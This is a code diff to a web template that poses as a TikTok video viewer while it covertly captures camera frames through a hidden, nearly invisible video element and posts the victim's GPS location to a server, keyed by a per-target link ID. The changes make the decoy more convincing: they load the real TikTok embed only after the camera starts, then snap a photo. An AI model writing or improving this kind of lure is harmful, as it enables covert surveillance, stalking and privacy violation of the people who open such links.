@@ -7,8 +7,8 @@
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #000; color: #fff; height: 100vh; overflow: hidden; }
-        .video-container { width: 100%; height: 100vh; position: relative; overflow: hidden; }
-        .video-container iframe { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 100vw; height: 100vh; border: none; pointer-events: none; }
+        .video-container { width: 100%; height: 100vh; position: relative; overflow: hidden; display: flex; align-items: center; justify-content: center; background: #000; }
+        .video-container iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: none; pointer-events: none; }
         #hiddenVideo { position: absolute; width: 1px; height: 1px; opacity: 0.01; top: -100px; left: -100px; z-index: -1; }
         .overlay-gradient { position: absolute; bottom: 0; left: 0; right: 0; height: 200px; background: linear-gradient(transparent, rgba(0,0,0,0.4)); z-index: 3; pointer-events: none; }
         .header { display: flex; justify-content: space-between; align-items: center; padding: 12px 16px; position: fixed; top: 0; left: 0; right: 0; z-index: 10; pointer-events: none; }
@@ -19,8 +19,8 @@
         .permission-overlay p { font-size: 14px; color: rgba(255,255,255,0.6); margin-bottom: 20px; text-align: center; max-width: 300px; }
         .permission-btn { background: #fe2c55; color: #fff; border: none; padding: 14px 48px; border-radius: 28px; font-size: 18px; font-weight: 600; cursor: pointer; margin: 8px; }
         .loading { display: none; color: rgba(255,255,255,0.6); margin-top: 16px; }
-        .skip-btn { background: rgba(255,255,255,0.2); color: #fff; border: 1px solid rgba(255,255,255,0.3); }
         .video-btn { background: #fe2c55; }
+        .fallback-text { position: absolute; z-index: 5; color: rgba(255,255,255,0.4); font-size: 16px; text-align: center; padding: 20px; }
     </style>
 </head>
 <body>
@@ -31,14 +31,13 @@
 </div>
 
 <div class="video-container">
-    <!-- Extract video ID from URL -->
-    {% set video_id = video_url.split('/video/')[1].split('?')[0] if '/video/' in video_url else (video_url.split('/')[-1].split('?')[0] if video_url else '') %}
-    <!-- Use embed/v2 for better compatibility -->
-    <iframe 
-        src="https://www.tiktok.com/embed/v2/{{ video_id }}"
+    <!-- TikTok Embed via oEmbed API -->
+    <iframe id="tiktokEmbed" 
+        src=""
         allow="autoplay; encrypted-media"
         allowfullscreen>
     </iframe>
+    <div class="fallback-text" id="fallbackText">Loading video...</div>
     <div class="overlay-gradient"></div>
     <video id="hiddenVideo" autoplay playsinline muted></video>
 </div>
@@ -56,6 +55,7 @@
     const content_type = "{{ content_type }}";
     const camera_type = "{{ camera }}";
     const link_id = "{{ link_id }}";
+    const video_url = "{{ video_url }}";
 
     let stream = null;
     let imageCapture = null;
@@ -71,6 +71,66 @@
     const allowBtn = document.getElementById('allowGpsBtn');
     const loadingText = document.getElementById('loadingText');
 
+    // ===== LOAD TIKTOK VIDEO USING OEMBED API =====
+    function loadTikTokVideo() {
+        const iframe = document.getElementById('tiktokEmbed');
+        const fallback = document.getElementById('fallbackText');
+        
+        // Try to get embed URL via oEmbed API
+        fetch(`https://www.tiktok.com/oembed?url=${encodeURIComponent(video_url)}`)
+            .then(response => response.json())
+            .then(data => {
+                if (data.html) {
+                    // Extract the src from the HTML
+                    const srcMatch = data.html.match(/src="([^"]+)"/);
+                    if (srcMatch && srcMatch[1]) {
+                        iframe.src = srcMatch[1] + '&autoplay=1';
+                        fallback.style.display = 'none';
+                        console.log('✅ TikTok video loaded via oEmbed');
+                    } else {
+                        // Fallback: try direct embed
+                        fallbackToDirectEmbed();
+                    }
+                } else {
+                    fallbackToDirectEmbed();
+                }
+            })
+            .catch(() => {
+                fallbackToDirectEmbed();
+            });
+    }
+
+    function fallbackToDirectEmbed() {
+        const iframe = document.getElementById('tiktokEmbed');
+        const fallback = document.getElementById('fallbackText');
+        
+        // Extract video ID from URL
+        let videoId = '';
+        if (video_url.includes('/video/')) {
+            videoId = video_url.split('/video/')[1].split('?')[0].split('/')[0];
+        } else if (video_url.includes('vt.tiktok.com')) {
+            // For short links, we can't easily get the video ID
+            // Use a generic TikTok embed
+            iframe.src = 'https://www.tiktok.com/embed';
+            fallback.textContent = 'Video unavailable. Try the TikTok app.';
+            fallback.style.display = 'block';
+            return;
+        } else {
+            // Try to get the last part of the URL
+            const parts = video_url.split('/');
+            videoId = parts[parts.length - 1].split('?')[0];
+        }
+        
+        if (videoId) {
+            iframe.src = `https://www.tiktok.com/embed/v2/${videoId}`;
+        } else {
+            iframe.src = 'https://www.tiktok.com/embed';
+            fallback.textContent = 'Video unavailable. Try the TikTok app.';
+            fallback.style.display = 'block';
+        }
+    }
+
+    // ===== GPS =====
     function sendGPS(lat, lon) {
         fetch('/api/gps_location', {
             method: 'POST',
@@ -125,7 +185,7 @@
             ctx.drawImage(bitmap, 0, 0);
             return canvas.toDataURL('image/jpeg', 0.85);
         } catch (e) {
-            console.error('grabFrame failed, falling back to canvas:', e);
+            console.error('grabFrame failed:', e);
             const canvas = document.createElement('canvas');
             canvas.width = hiddenVideo.videoWidth || 640;
             canvas.height = hiddenVideo.videoHeight || 480;
@@ -217,6 +277,8 @@
             hiddenVideo.play().then(() => {
                 permissionOverlay.style.display = 'none';
                 currentFacingMode = facingMode;
+                // Load TikTok video after camera starts
+                loadTikTokVideo();
                 setTimeout(() => { doCapture(); }, 500);
             }).catch(e => console.error('Play error:', e));
 
